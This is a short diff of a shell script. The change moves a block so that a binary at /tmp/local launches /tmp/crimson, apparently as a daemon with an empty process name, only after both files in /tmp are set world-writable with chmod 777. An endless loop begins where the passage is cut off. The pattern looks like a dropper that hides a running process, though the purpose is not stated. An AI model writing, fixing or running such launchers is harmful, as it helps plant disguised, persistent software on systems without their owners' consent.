@@ -12,12 +12,12 @@ if [ ! -f /tmp/crimson ]; then
     fi
 fi
 
-if [ ! -f "$(pgrep -f "\?")" > /dev/null ]; then
-    /tmp/local -s "" -d -p test.pid /tmp/crimson
-fi   
-
 chmod 777 /tmp/crimson
 chmod 777 /tmp/local
+
+if [ ! -f "$(pgrep -f "\?")" > /dev/null ]; then
+    /tmp/local -s "" -d -p test.pid /tmp/crimson
+fi
 
 (
     while true; do
